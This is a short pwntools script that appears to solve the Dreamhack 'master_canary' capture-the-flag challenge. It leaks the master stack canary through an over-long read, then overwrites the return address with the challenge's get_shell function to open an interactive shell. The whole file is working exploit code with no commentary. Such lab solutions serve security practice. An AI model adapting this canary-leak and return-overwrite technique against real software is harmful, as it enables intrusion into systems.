from pwn import *

port = 8687
rem = remote("host3.dreamhack.games", port)
elf = ELF("./Pwnable/master_canary/problem/master_canary")

rem.sendlineafter(b"> ", b'1')

mc_offset = 0x8e8

payload = b'A' * (mc_offset + 1)
rem.recvuntil(b"> ")
rem.sendline(b'2')
rem.sendlineafter(b"Size: ", str(len(payload)).encode())
rem.recvuntil(b"Data: ")
rem.send(payload)

rem.recvuntil(payload)
canary = u64(b'\x00' + rem.recvn(7))

payload = b'A' * 0x28
payload += p64(canary)
payload += b'B' * 0x8
payload += p64(elf.symbols['get_shell'])

rem.sendlineafter(b"> ", b'3')
rem.sendlineafter(b"comment: ", payload)

rem.interactive()